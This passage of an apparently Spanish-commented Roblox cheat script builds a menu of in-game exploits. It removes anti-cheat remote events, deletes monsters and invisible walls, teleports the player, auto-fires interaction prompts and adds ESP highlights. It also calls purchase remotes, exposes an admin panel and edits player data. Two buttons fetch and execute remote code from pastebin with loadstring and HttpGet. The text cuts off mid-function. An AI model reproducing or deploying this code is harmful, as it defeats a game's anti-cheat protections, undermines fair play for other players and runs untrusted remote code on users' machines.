		if typeofnotif == "error" then
			icon = "rbxassetid://2592670449" -- Ícono de error
		elseif typeofnotif == "warning" then
			icon = "rbxassetid://17453328281" -- Ícono de advertencia
		else
			icon = "rbxassetid://12900311435" -- Ícono de mensaje
		end

		game.StarterGui:SetCore("SendNotification", {
			Title = title,
			Text = text,
			Duration = 5, -- Duración de la notificación en segundos
			Icon = icon
		})

		-- Reproducir sonido
		local sound = Instance.new("Sound")
		sound.SoundId = "rbxassetid://" .. soundId
		sound.Parent = workspace
		sound:Play()

		-- Destruir el sonido cuando termine
		sound.Ended:Connect(function()
			sound:Destroy()
			print("DEBUG: Sonido destruido después de reproducirse.") -- Depuración
		end)
	end

	-- Función para buscar CurrentRoom y reiniciar si se elimina
	local function findCurrentRoom()
		local currentRoom
		repeat
			print("DEBUG: Buscando CurrentRoom...") -- Depuración
			currentRoom = game.Workspace:FindFirstChild("CurrentRoom")
			if not currentRoom then
				print("DEBUG: CurrentRoom no encontrado. Intentando de nuevo...") -- Depuración
				wait(1) -- Esperar un segundo antes de volver a intentar
			end
		until currentRoom

		print("DEBUG: CurrentRoom encontrado:", currentRoom.Name) -- Depuración

		return currentRoom
	end

	-- Buscar la sala actual y obtener los monstruos
	local currentRoom = findCurrentRoom()

	local monstersFolder


	repeat 
		wait(4)
		for _, roomModel in pairs(currentRoom:GetChildren()) do
			if roomModel:IsA("Model") and roomModel:FindFirstChild("Monsters") then
				monstersFolder = roomModel:FindFirstChild("Monsters")
				print("DEBUG: Monsters folder encontrado:", monstersFolder.Name) -- Depuración
				break
			end
		end
	until monstersFolder

	if not monstersFolder then
		sendNotificationWithSound("Error", "No Monsters folder found!", "478544929", "error")
		print("DEBUG: No se encontró el Monsters folder.") -- Depuración
		return
	end

	-- Función para obtener todos los monstruos del MonstersFolder
	local monstersList = {}
	local function getMonsters()
		if not monstersFolder then 
			repeat 
				for _, roomModel in pairs(currentRoom:GetChildren()) do
					if roomModel:IsA("Model") and roomModel:FindFirstChild("Monsters") then
						monstersFolder = roomModel:FindFirstChild("Monsters")
						print("DEBUG: Monsters folder encontrado:", monstersFolder.Name) -- Depuración
						break
					end
				end
			until monstersFolder
		end
		table.clear(monstersList)
		print("DEBUG: Limpiando la lista de monstruos.") -- Depuración
		wait() -- Esperar brevemente antes de llenar la lista
		for _, monster in pairs(monstersFolder:GetChildren()) do
			if monster:IsA("Model") and monster:FindFirstChild("HumanoidRootPart") then
				print("DEBUG: Monstruo encontrado:", monster.Name) -- Depuración
				table.insert(monstersList, monster)
			end
		end
		return monstersList
	end

	-- Función para iniciar la órbita y distracción
	function AutoDistract:Start()
		if AutoDistract.CurrentlyRunning then
			print("DEBUG: AutoDistract ya está corriendo.") -- Depuración
			return
		end

		AutoDistract.CurrentlyRunning = true
		print("DEBUG: AutoDistract ha comenzado.") -- Depuración

		local monster = AutoDistract.MonstersSelected[1]
		if not monster then
			print("DEBUG: No hay monstruo seleccionado.") -- Depuración
			AutoDistract.CurrentlyRunning = false
			return
		end

		print("DEBUG: Monstruo seleccionado para Telestaportarse arriba:", monster.Name) -- Depuración

		local humanoid = monster:FindFirstChild("Humanoid")
		local rootPart = monster:FindFirstChild("HumanoidRootPart")
		if not humanoid or not rootPart then
			print("DEBUG: El monstruo no tiene Humanoid o HumanoidRootPart.") -- Depuración
			--reiniciar todo a predeterminado

			return
		end

		local player = game.Players.LocalPlayer
		local character = player.Character
		local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
		if not humanoidRootPart then
			print("DEBUG: No se encontró HumanoidRootPart en el jugador.") -- Depuración
			AutoDistract.CurrentlyRunning = false
			return
		end

		-- Función para telestaportarse al jugador arriba del monstruo
		local function TPUpMonster()
			print("DEBUG: Comenzando Telestaportacion arriba del monstruo.") -- Depuración
			while AutoDistract.CurrentlyRunning do
				--hacer que el jugador se telestaporte arriba del modelo del mounstro, pero que el mounstro no lo alcanze
				humanoidRootPart.CFrame = rootPart.CFrame * CFrame.new(0, 16, 0)
				--quitarle todo el velocity al jugador local asi el jugador local no se caiga cuanto es telestaportado
				humanoidRootPart.Velocity = Vector3.new(0, 0, 0)
				wait(0.01)
			end
		end
		--remove every invisborder or inviswall from workspace
		for _, v in pairs(workspace:GetDescendants()) do
			if v.Name:lower() == "invisborder" then
				v:Destroy()
			elseif v.Name:lower() == "inviswall" then
				v:Destroy()
			end
		end
		if workspace:FindFirstChild("CurrentRoom") then
			for _, v in pairs(workspace.CurrentRoom:GetDescendants()) do
				if v.Name:lower() == "invisborder" then
					v:Destroy()
				elseif v.Name == "inviswall" then
					v:Destroy()
				end
			end
		end
		spawn(TPUpMonster)
	end

	-- Función para detener la órbita
	function AutoDistract:Stop()
		if not AutoDistract.CurrentlyRunning then
			print("DEBUG: AutoDistract no está corriendo.") -- Depuración
			return
		end

		AutoDistract.CurrentlyRunning = false
		print("DEBUG: AutoDistract detenido.") -- Depuración
	end

	-- Conectar los botones de la interfaz de usuario a las funciones
	AutoDistract.startBTN.MouseButton1Click:Connect(function()
		print("DEBUG: Botón Start presionado.") -- Depuración
		AutoDistract:Start()
	end)

	AutoDistract.stopBTN.MouseButton1Click:Connect(function()
		print("DEBUG: Botón Stop presionado.") -- Depuración
		AutoDistract:Stop()
	end)

	AutoDistract.selectBTN.MouseButton1Click:Connect(function()
		print("DEBUG: Botón Select presionado.") -- Depuración
		-- Obtener la lista actualizada de monstruos
		if #monstersList == 0 then
			print("DEBUG: Lista de monstruos vacía. Llamando a getMonsters().") -- Depuración
			AutoDistract.selectBTN.Text = "No monsters"
			getMonsters()
			return
		end

		AutoDistract.CurrentMonsterIndex = AutoDistract.CurrentMonsterIndex + 1
		if AutoDistract.CurrentMonsterIndex > #monstersList then
			AutoDistract.CurrentMonsterIndex = 1
		end

		local nextMonster = monstersList[AutoDistract.CurrentMonsterIndex]
		print("DEBUG: Seleccionando siguiente monstruo:", nextMonster.Name) -- Depuración
		AutoDistract:SelectMonster(nextMonster)
	end)

	script.Parent.reiniciartodo.MouseButton1Click:Connect(function()
		sendNotificationWithSound("Error", "Restarting...", "478544929", "error")
		AutoDistract.CurrentlyRunning = false
		AutoDistract.MonstersSelected = {}
		AutoDistract.CurrentMonsterIndex = 1
		AutoDistract.selectBTN.Text = "No monsters"
		getMonsters()
	end)
end;
task.spawn(C_95);
-- StarterGui.DebugVersion.Title.script_content.MainTwo.XDDDDD.LocalScript
local function C_9c()
	local script = G2L["9c"];
	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Parent.Main.Visible = false
		script.Parent.Parent.Parent.MainTwo.Visible = false
		script.Parent.Parent.Parent.MainThird.Visible = true
		script.Parent.Parent.Parent.MainFive.Visible = false
	end)
end;
task.spawn(C_9c);
-- StarterGui.DebugVersion.Title.script_content.MainTwo.Aut.LocalScript
local function C_9f()
	local script = G2L["9f"];
	script.Parent.MouseButton1Click:Connect(function()
		local replicatedStorage = game:GetService("ReplicatedStorage")
		if replicatedStorage then
			local eventsFolder = replicatedStorage:FindFirstChild("Events")
			if eventsFolder then
				local antiCheatTrigger = eventsFolder:FindFirstChild("WarnUser")
				if antiCheatTrigger then
					antiCheatTrigger:Remove()
				else
					warn("AntiCheatTrigger event not found in Events folder.")
				end
			else
				warn("Events folder not found in ReplicatedStorage.")
			end
		else
			warn("ReplicatedStorage service not found.")
		end

	end)
end;
task.spawn(C_9f);
-- StarterGui.DebugVersion.Title.script_content.MainTwo.Aut.LocalScript
local function C_a8()
	local script = G2L["a8"];
	script.Parent.MouseButton1Click:Connect(function()
		local replicatedStorage = game:GetService("ReplicatedStorage")
		if replicatedStorage then
			local eventsFolder = replicatedStorage:FindFirstChild("Events")
			if eventsFolder then
				local antiCheatTrigger = eventsFolder:FindFirstChild("AntiCheatTrigger")
				if antiCheatTrigger then
					antiCheatTrigger:Remove()
				else
					warn("AntiCheatTrigger event not found in Events folder.")
				end
			else
				warn("Events folder not found in ReplicatedStorage.")
			end
		else
			warn("ReplicatedStorage service not found.")
		end

	end)
end;
task.spawn(C_a8);
-- StarterGui.DebugVersion.Title.script_content.MainTwo.rm.LocalScript
local function C_ad()
	local script = G2L["ad"];
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local StarterGui = game:GetService("StarterGui")

	-- Función para enviar una notificación
	local function sendNotification(title, text)
		StarterGui:SetCore("SendNotification", {
			Title = title,
			Text = text,
			Duration = 5, -- Duración de la notificación en segundos
		})
	end

	local function TP(Target)
		local LocalPlayer = game.Players.LocalPlayer
		local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()

		-- Verifica si el objetivo es un BasePart y teletransporta
		if typeof(Target) == "Instance" and Target:IsA("BasePart") then
			Character:SetPrimaryPartCFrame(Target.CFrame)
		else
			warn("Target is not a valid BasePart for teleportation")
		end
	end
	local function Debug(str, keynum)
		if script.Parent.Parent.Parent.options.debug.Visible == true then return end

		if keynum == 1 then --just a message
			print("[DEBUG]: "..str)
		elseif keynum == 2 then --warning
			print("[DEBUG_WARN]: "..str)
		elseif keynum == 3 then --error
			print("[DEBUG_ERROR]: "..str)
		elseif keynum == 4 then --sucess
			print("[DEBUG_SUCESS]: "..str)
		elseif not keynum then
			print("[¿DEBUG?]: "..str)
		end
	end



	script.Parent.MouseButton1Click:Connect(function()
		sendNotification("Remove Monsters", "Now The Monsters are invisible... ¡Good Luck!")
		for _,k in pairs(game.Workspace.CurrentRoom:GetChildren()) do
			if k:IsA("Model") then
				local room = k
				for _,v in pairs(room:FindFirstChild("Monsters"):GetChildren()) do
					repeat Wait() until v
					if v then
						v:Destroy()
					end
				end
			end
		end
	end)
end;
task.spawn(C_ad);
-- StarterGui.DebugVersion.Title.script_content.MainTwo.xdd.LocalScript
local function C_b0()
	local script = G2L["b0"];
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local StarterGui = game:GetService("StarterGui")

	-- Función para enviar una notificación
	local function sendNotification(title, text)
		StarterGui:SetCore("SendNotification", {
			Title = title,
			Text = text,
			Duration = 5, -- Duración de la notificación en segundos
		})
	end

	local function TP(Target)
		local LocalPlayer = game.Players.LocalPlayer
		local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()

		-- Verifica si el objetivo es un BasePart y teletransporta
		if typeof(Target) == "Instance" and Target:IsA("BasePart") then
			Character:SetPrimaryPartCFrame(Target.CFrame)
		else
			warn("Target is not a valid BasePart for teleportation")
		end
	end
	local function Debug(str, keynum)
		if script.Parent.Parent.Parent.options.debug.Visible == true then return end

		if keynum == 1 then --just a message
			print("[DEBUG]: "..str)
		elseif keynum == 2 then --warning
			print("[DEBUG_WARN]: "..str)
		elseif keynum == 3 then --error
			print("[DEBUG_ERROR]: "..str)
		elseif keynum == 4 then --sucess
			print("[DEBUG_SUCESS]: "..str)
		elseif not keynum then
			print("[¿DEBUG?]: "..str)
		end
	end



	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet("https://pastebin.com/raw/xELCnKuC"))()
	end)
end;
task.spawn(C_b0);
-- StarterGui.DebugVersion.Title.script_content.MainTwo.sadasd.LocalScript
local function C_b3()
	local script = G2L["b3"];
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local StarterGui = game:GetService("StarterGui")

	-- Función para enviar una notificación
	local function sendNotification(title, text)
		StarterGui:SetCore("SendNotification", {
			Title = title,
			Text = text,
			Duration = 5, -- Duración de la notificación en segundos
		})
	end

	local function TP(Target)
		local LocalPlayer = game.Players.LocalPlayer
		local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()

		-- Verifica si el objetivo es un BasePart y teletransporta
		if typeof(Target) == "Instance" and Target:IsA("BasePart") then
			Character:SetPrimaryPartCFrame(Target.CFrame)
		else
			warn("Target is not a valid BasePart for teleportation")
		end
	end
	local function Debug(str, keynum)
		if script.Parent.Parent.Parent.options.debug.Visible == true then return end

		if keynum == 1 then --just a message
			print("[DEBUG]: "..str)
		elseif keynum == 2 then --warning
			print("[DEBUG_WARN]: "..str)
		elseif keynum == 3 then --error
			print("[DEBUG_ERROR]: "..str)
		elseif keynum == 4 then --sucess
			print("[DEBUG_SUCESS]: "..str)
		elseif not keynum then
			print("[¿DEBUG?]: "..str)
		end
	end



	script.Parent.MouseButton1Click:Connect(function()
		sendNotification("Removing", "InvisBorders/Walls")
		--remove every invisborder or inviswall from workspace
		-- Function to remove specific objects by name
		local function removeInvisibleParts(parent)
			for _, v in pairs(parent:GetDescendants()) do
				local nameLower = v.Name:lower()
				if nameLower == "invisborder" or nameLower == "inviswall" or nameLower == "invisiblewall" or nameLower == "invisibleborder"  then
					print("Removing " .. v.Name)
					v:Destroy()
				end
			end
		end

		-- Remove from the entire workspace
		removeInvisibleParts(workspace)

		-- Remove specifically from CurrentRoom, if it exists
		local currentRoom = workspace:FindFirstChild("CurrentRoom")
		if currentRoom then
			removeInvisibleParts(currentRoom)
		end

		Debug("Removed every InvisBorder/InvisWall from workspace", 4)
	end)
end;
task.spawn(C_b3);
-- StarterGui.DebugVersion.Title.script_content.MainTwo.xdd.LocalScript
local function C_b6()
	local script = G2L["b6"];
	--[[
	Section1:NewTextBox("Toon", "Choose any toon, make sure the name has the first letter capitalized and is spelled perfectly", function(txt)
		local args = {
	    [1] = txt
	}
	 
	game:GetService("ReplicatedStorage"):WaitForChild("EarnTutorialTower"):InvokeServer(unpack(args))
	end)
	 
	Section1:NewButton("Activate", "After clicking this, choose poppy, if it gives an error, rejoin", function()
	    game:GetService("ReplicatedStorage"):WaitForChild("CheckTutorial"):InvokeServer()
	end)
	 
	Section1:NewButton("Activate dandy", "gives you dandy", function()
	 
	local p = game.Players.LocalPlayer.UserId
	 
	local dandy = Instance.new("StringValue")
	dandy.Name = "Dandy"
	dandy.Parent = game.ReplicatedStorage.PlayerData:FindFirstChild(p)
	dandy.Value = "Default"
	 
	game:GetService("Players").LocalPlayer:Kick("Dandy Has Been Given, Rejoin Game.")
	end)
	 
	]]

	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local StarterGui = game:GetService("StarterGui")

	-- Función para enviar una notificación
	local function sendNotification(title, text)
		StarterGui:SetCore("SendNotification", {
			Title = title,
			Text = text,
			Duration = 5, -- Duración de la notificación en segundos
		})
	end

	local toons = {
		"Astro", "Gigi", "Shelly", "Vee", "Sprout", "Pebble", "Goob",
		"Glisten", "Rodger", "Teagan", "Brightney", "RazzleDazzle",
		"Cosmo", "Toodles", "Tisha", "Flutter", "Scraps", "Finn", "Shrimpo"
	}
	local function Debug(str, keynum)
		if script.Parent.Parent.Parent.options.debug.Visible == true then return end

		if keynum == 1 then --just a message
			print("[DEBUG]: "..str)
		elseif keynum == 2 then --warning
			print("[DEBUG_WARN]: "..str)
		elseif keynum == 3 then --error
			print("[DEBUG_ERROR]: "..str)
		elseif keynum == 4 then --sucess
			print("[DEBUG_SUCESS]: "..str)
		elseif not keynum then
			print("[¿DEBUG?]: "..str)
		end
	end


	-- Index to track which toon to show
	local currentIndex = 1

	-- Button click event
	script.Parent.MouseButton1Click:Connect(function()
		if currentIndex <= #toons then
			script.Parent.Text = currentIndex .. ". " .. toons[currentIndex]
			currentIndex = currentIndex + 1
		else
			currentIndex = 1 -- Reset to start over
			script.Parent.Text = currentIndex .. ". " .. toons[currentIndex]
		end
	end)

	script.Parent.Parent.getit.MouseButton1Click:Connect(function()

		task.spawn(function()
			print("looks like the user wants to get "..toons[currentIndex-1].." from "..(currentIndex-1)..".")
			local args = {
				[1] = tostring(toons[currentIndex-1])
			}

			game:GetService("ReplicatedStorage").BuyTower:InvokeServer(unpack(args))

			local args = {
				[1] = game:GetService("ReplicatedStorage").TowerData[toons[currentIndex-1]]
			}

			game:GetService("ReplicatedStorage").Events.ChangeChar:FireServer(unpack(args))
		end)

	end)

	script.Parent.Parent.getitToon.MouseButton1Click:Connect(function()
		task.spawn(function()
			print("looks like the user wants to get "..toons[currentIndex-1].." from "..(currentIndex-1)..".")
			Instance.new("Hint", workspace).Text = "This feature has been removed because it may permanently ban your account." wait(5) game.Workspace:FindFirstChildWhichIsA("Hint"):Remove()
		end)
	end)
end;
task.spawn(C_b6);
-- StarterGui.DebugVersion.Title.script_content.MainTwo.Aut.LocalScript
local function C_bb()
	local script = G2L["bb"];
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local StarterGui = game:GetService("StarterGui")

	-- Función para enviar una notificación
	local function sendNotification(title, text)
		StarterGui:SetCore("SendNotification", {
			Title = title,
			Text = text,
			Duration = 5, -- Duración de la notificación en segundos
		})
	end

	local function TP(Target)
		local LocalPlayer = game.Players.LocalPlayer
		local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()

		-- Verifica si el objetivo es un BasePart y teletransporta
		if typeof(Target) == "Instance" and Target:IsA("BasePart") then
			Character:SetPrimaryPartCFrame(Target.CFrame)
		else
			warn("Target is not a valid BasePart for teleportation")
		end
	end
	local function Debug(str, keynum)
		if script.Parent.Parent.Parent.options.debug.Visible == true then return end

		if keynum == 1 then --just a message
			print("[DEBUG]: "..str)
		elseif keynum == 2 then --warning
			print("[DEBUG_WARN]: "..str)
		elseif keynum == 3 then --error
			print("[DEBUG_ERROR]: "..str)
		elseif keynum == 4 then --sucess
			print("[DEBUG_SUCESS]: "..str)
		elseif not keynum then
			print("[¿DEBUG?]: "..str)
		end
	end

	local toggle = false -- Item Aura toggle state
	local range = 30 -- Range to detect proximity prompts

	-- Function to interact with proximity prompts
	local function interactWithPrompt(prompt)
		if prompt.HoldDuration == 0 then
			prompt:InputHoldBegin()
			prompt:InputHoldEnd()
		else
			prompt:InputHoldBegin()
			wait(prompt.HoldDuration)
			prompt:InputHoldEnd()
		end
	end

	-- Function to check for proximity prompts in CurrentRoom
	local function checkForProximityPrompts()
		if toggle then
			local player = game.Players.LocalPlayer
			local character = player.Character
			if character then
				local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
				if humanoidRootPart then
					local currentRoomFolder = workspace:FindFirstChild("CurrentRoom")
					if currentRoomFolder then
						for _, model in pairs(currentRoomFolder:GetChildren()) do
							local itemsFolder = model:FindFirstChild("Items")
							if itemsFolder then
								for _, item in pairs(itemsFolder:GetChildren()) do
									local promptPart = item:FindFirstChild("Prompt")
									if promptPart then
										local proximityPrompt = promptPart:FindFirstChild("ProximityPrompt")
										if proximityPrompt and proximityPrompt.Enabled then
											local distance = (promptPart.Position - humanoidRootPart.Position).Magnitude
											if distance <= range then
												interactWithPrompt(proximityPrompt)
											end
										end
									end
								end
							end
						end
					end
				end
			end
		end
	end

	script.Parent.MouseButton1Click:Connect(function()
		toggle = not toggle
		if toggle then
			print("Item Aura On")
			while toggle do
				checkForProximityPrompts()
				wait(0.05) -- Adjust this delay if needed for responsiveness
			end
		else
			print("Item Aura Off")
		end
	end)
end;
task.spawn(C_bb);
-- StarterGui.DebugVersion.Title.script_content.MainTwo.Aut.LocalScript
local function C_be()
	local script = G2L["be"];
	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Parent.Main.Visible = true
		script.Parent.Parent.Parent.MainTwo.Visible = false
	end)
end;
task.spawn(C_be);
-- StarterGui.DebugVersion.Title.script_content.MainFour.LocalScript
local function C_c4()
	local script = G2L["c4"];
	--local args = {
	--	[1] = "Dandy"
	--}

	--game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("Voted"):InvokeServer(unpack(args))

	--local player = game:GetService("Players").LocalPlayer
	--local popUp = player.PlayerGui.ScreenGui:FindFirstChild("PopUp")

	--if popUp then
	--	popUp:Destroy()
	--end



	--local player = game:GetService("Players").LocalPlayer
	--local skillCheckFrame = player.PlayerGui.ScreenGui.Menu:FindFirstChild("SkillCheckFrame")

	--if skillCheckFrame then
	--	skillCheckFrame:Destroy()
	--end


	--loadstring(game:HttpGet("https://pastebin.com/raw/LrGDCr7Z"))()


	--old esp
	--local function highlightMonsters()
	--	local currentRoom = workspace:FindFirstChild("CurrentRoom")
	--	if currentRoom then
	--		for _, item in pairs(currentRoom:GetChildren()) do
	--			if item:IsA("Model") then
	--				local monstersFolder = item:FindFirstChild("Monsters")
	--				if monstersFolder then
	--					for _, monster in pairs(monstersFolder:GetChildren()) do
	--						if monster:IsA("Model") then
	--							-- Verifica si ya tiene un Highlight para evitar duplicados
	--							if not monster:FindFirstChildOfClass("Highlight") then
	--								local highlight = Instance.new("Highlight")
	--								highlight.Parent = monster
	--								highlight.FillColor = Color3.new(1, 0, 0)  -- Rojo
	--								highlight.OutlineColor = Color3.new(1, 1, 1)  -- Blanco
	--								highlight.FillTransparency = 0.5
	--							end
	--						end
	--					end
	--				end
	--			end
	--		end
	--	end
	--end

	---- Ejecuta la función cada segundo
	--while true do
	--	highlightMonsters()
	--	wait(1)
	--end

end;
task.spawn(C_c4);
-- StarterGui.DebugVersion.Title.script_content.MainFour.callatt.LocalScript
local function C_cb()
	local script = G2L["cb"];
	script.Parent.MouseButton1Click:Connect(function()
		local args = {
			[1] = "Dandy"
		}

		game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("Voted"):InvokeServer(unpack(args))

	end)
end;
task.spawn(C_cb);
-- StarterGui.DebugVersion.Title.script_content.MainFour.callatt.LocalScript
local function C_ce()
	local script = G2L["ce"];
	script.Parent.MouseButton1Click:Connect(function()

		local player = game:GetService("Players").LocalPlayer
		local popUp = player.PlayerGui.ScreenGui:FindFirstChild("PopUp")

		if popUp then
			popUp:Destroy()
		end

	end)
end;
task.spawn(C_ce);
-- StarterGui.DebugVersion.Title.script_content.MainFour.callatt.LocalScript
local function C_d1()
	local script = G2L["d1"];
	script.Parent.MouseButton1Click:Connect(function()
		local player = game:GetService("Players").LocalPlayer
		local skillCheckFrame = player.PlayerGui.ScreenGui.Menu:FindFirstChild("SkillCheckFrame")

		if skillCheckFrame then
			skillCheckFrame:Destroy()
		end
	end)
end;
task.spawn(C_d1);
-- StarterGui.DebugVersion.Title.script_content.MainFour.callatt.LocalScript
local function C_d4()
	local script = G2L["d4"];
	script.Parent.MouseButton1Click:Connect(function()

		loadstring(game:HttpGet("https://pastebin.com/raw/LrGDCr7Z"))()

	end)
end;
task.spawn(C_d4);
-- StarterGui.DebugVersion.Title.script_content.MainFour.callatt.LocalScript
local function C_d7()
	local script = G2L["d7"];
	script.Parent.MouseButton1Click:Connect(function()
		local function highlightMonsters()
			local currentRoom = workspace:FindFirstChild("CurrentRoom")
			if currentRoom then
				for _, item in pairs(currentRoom:GetChildren()) do
					if item:IsA("Model") then
						local monstersFolder = item:FindFirstChild("Monsters")
						if monstersFolder then
							for _, monster in pairs(monstersFolder:GetChildren()) do
								if monster:IsA("Model") then

									if not monster:FindFirstChildOfClass("Highlight") then
										local highlight = Instance.new("Highlight")
										highlight.Parent = monster
										highlight.FillColor = Color3.new(1, 0, 0)  --
										highlight.OutlineColor = Color3.new(1, 1, 1)  
										highlight.FillTransparency = 0.5
									end
								end
							end
						end
					end
				end
			end
		end

		-- Ejecuta la función cada segundo
		while true do
			highlightMonsters()
			wait(1)
		end

	end)
end;
task.spawn(C_d7);
-- StarterGui.DebugVersion.Title.script_content.MainFour.callatt.LocalScript
local function C_da()
	local script = G2L["da"];
	script.Parent.MouseButton1Click:Connect(function()
		local ScreenGui =  Instance.new("ScreenGui", game.CoreGui)
		game:GetService("ReplicatedStorage").Admin.DevFrame.Parent  = ScreenGui
	end)
end;
task.spawn(C_da);
-- StarterGui.DebugVersion.Title.script_content.MainFour.ScrollingFrame.LocalScript
local function C_dc()
	local script = G2L["dc"];
	local player = game.Players.LocalPlayer
	local userId = player.UserId
	local playerData = game:GetService("ReplicatedStorage"):WaitForChild("PlayerData")[tostring(userId)]

	-- Referencia al ScrollingFrame donde se agregarán los TextBox
	local scrollingFrame = script.Parent
	assert(scrollingFrame:IsA("ScrollingFrame"), "El script debe estar dentro de un ScrollingFrame.")

	-- Margen y tamaño de los TextBox
	local textBoxHeight = 30
	local margin = 5
	local spacing = textBoxHeight + margin

	-- Crear TextBox para cada valor en PlayerData
	local index = 0
	for _, valueInstance in ipairs(playerData:GetChildren()) do
		-- Validar que sea un tipo de valor soportado
		if valueInstance:IsA("ValueBase") then
			-- Crear un nuevo TextBox
			local textBox = Instance.new("TextBox")
			textBox.Size = UDim2.new(1, -2 * margin, 0, textBoxHeight) -- Ancho ajustado con márgenes
			textBox.Position = UDim2.new(0, margin, 0, index * spacing) -- Posición vertical incremental
			textBox.Text = ""
			textBox.TextScaled = true -- Ajusta automáticamente el tamaño del texto
			textBox.TextColor3 = Color3.new(0, 0, 0) -- Color del texto
			textBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255) -- Fondo blanco
			textBox.BorderSizePixel = 1
			textBox.PlaceholderText = "set "..valueInstance.Name.." Here..."
			textBox.Parent = scrollingFrame

			-- Conectar el evento para actualizar el valor cuando se pierda el foco
			textBox.FocusLost:Connect(function(enterPressed)
				if enterPressed then
					if valueInstance:IsA("NumberValue") then
						local newValue = tonumber(textBox.Text)
						if newValue then
							valueInstance.Value = newValue
						else
							textBox.Text = tostring(valueInstance.Value) -- Restaurar el valor original si la entrada no es válida
						end
					elseif valueInstance:IsA("StringValue") then
						valueInstance.Value = textBox.Text
					elseif valueInstance:IsA("BoolValue") then
						valueInstance.Value = (textBox.Text:lower() == "true") -- Convertir "true"/"false"
					end
				end
			end)

			index += 1 -- Incrementar el índice para el próximo TextBox
		end
	end

	-- Ajustar el tamaño del ScrollingFrame para adaptarse a los TextBox generados
	scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, index * spacing)

end;
task.spawn(C_dc);
-- StarterGui.DebugVersion.Title.script_content.MainFour.callatt.LocalScript
local function C_e1()
	local script = G2L["e1"];
	script.Parent.MouseButton1Click:Connect(function()
		-- Definimos las variables principales
		local elevatorsFolder = game.Workspace:FindFirstChild("Elevators")
		local currentRoomFolder = game.Workspace:FindFirstChild("CurrentRoom")
		local player = game.Players.LocalPlayer
		local character = player.Character or player.CharacterAdded:Wait()
		local GettingChased = false  

		local function TPTDH()
			if elevatorsFolder then
				local elevatorModel = elevatorsFolder:FindFirstChild("Elevator")
				if elevatorModel then
					local doorHitbox = elevatorModel:FindFirstChild("DoorHitbox")
					if doorHitbox then
						-- Teletransportar al jugador a la parte DoorHitbox, pero más arriba
						character:SetPrimaryPartCFrame(doorHitbox.CFrame + Vector3.new(0, 20, 0))
						wait(6)  -- Esperar 6 segundos antes de continuar
						return true
					else
						warn("DoorHitbox not found")
					end
				else
					warn("Elevator model not found")
				end
			else
				warn("Elevators folder not found")
			end
			return false
		end

		-- Función para encontrar el mejor generador
		local function findBestGenerator()
			if not currentRoomFolder then return nil end
			local bestGenerator = nil
			local lowestAmount = math.huge

			for _, room in pairs(currentRoomFolder:GetChildren()) do
				if room:IsA("Model") then
					local generatorsFolder = room:FindFirstChild("Generators")
					if generatorsFolder then
						for _, generator in pairs(generatorsFolder:GetChildren()) do
							if generator:IsA("Model") then
								local statsFolder = generator:FindFirstChild("Stats")
								if statsFolder then
									local currentAmount = statsFolder:FindFirstChild("CurrentAmount")
									if currentAmount and currentAmount:IsA("NumberValue") and currentAmount.Value < lowestAmount then
										bestGenerator = generator
										lowestAmount = currentAmount.Value
									end
								end
							end
						end
					end
				end
			end

			return bestGenerator
		end

		-- Función para teletransportar al jugador al generador
		local function teleportToGenerator(generator)
			if generator then
				local lightPart = generator:FindFirstChild("Light")
				if lightPart and lightPart:IsA("BasePart") then
					character:SetPrimaryPartCFrame(lightPart.CFrame)
					wait(0.01)  -- Pequeño retraso antes de activar el ProximityPrompt
				else
					warn("Light part not found")
					return false
				end

				-- Buscar la parte "Prompt" y activar el ProximityPrompt
				local promptPart = generator:FindFirstChild("Prompt")
				if promptPart and promptPart:IsA("BasePart") then
					local proximityPrompt = promptPart:FindFirstChild("ProximityPrompt")
					if proximityPrompt and proximityPrompt:IsA("ProximityPrompt") then
						for i = 1, 3 do
							fireproximityprompt(proximityPrompt)
							wait(0.01)  -- Esperar un pequeño intervalo entre intentos
						end
					else
						warn("ProximityPrompt not found")
						return false
					end
				else
					warn("Prompt part not found")
					return false
				end
			end
			return true
		end

		-- Función para monitorear el generador
		local function monitorGenerator(generator)
			if generator then
				local statsFolder = generator:FindFirstChild("Stats")
				if statsFolder then
					local currentAmount = statsFolder:FindFirstChild("CurrentAmount")
					if currentAmount and currentAmount:IsA("NumberValue") then
						local previousAmount = currentAmount.Value
						local unchangedTime = 0
						local checkInterval = 0.5

						while true do
							wait(checkInterval)

							if currentAmount.Value >= 45 then
								return true  -- Generador completado
							end

							if currentAmount.Value == previousAmount then
								unchangedTime = unchangedTime + checkInterval
							else
								previousAmount = currentAmount.Value
								unchangedTime = 0
							end

							if unchangedTime >= 0.2 then
								warn("Generator stopped increasing")
								return true  -- El generador ha dejado de aumentar
							end
						end
					end
				end
			end
			return false
		end

		-- Función para manejar la detección de "Chasing"
		local function monitorChasing(monster)
			local chaserScript = monster:FindFirstChild("Chaser")
			if chaserScript then
				local chasingValue = chaserScript:FindFirstChild("Chasing")
				if chasingValue and chasingValue:IsA("BoolValue") then
					-- Escuchar cuando el valor de Chasing cambie
					chasingValue.Changed:Connect(function(newValue)
						if newValue == true then
							GettingChased = true
							if TPTDH() then  -- Teletransportar al jugador al DoorHitbox
								warn("Player is being chased!")
								wait(6)  -- Esperar 6 segundos antes de continuar con los generadores
								GettingChased = false
								warn("Resuming generator work...")
							end
						end
					end)
				end
			end
		end

		-- Función principal
		local function mainLoop()
			-- Buscar la carpeta de monstruos en cada habitación
			for _, room in pairs(currentRoomFolder:GetChildren()) do
				local monstersFolder = room:FindFirstChild("Monsters")
				if monstersFolder then
					-- Monitorear cada monstruo en la carpeta "Monsters"
					for _, monster in pairs(monstersFolder:GetChildren()) do
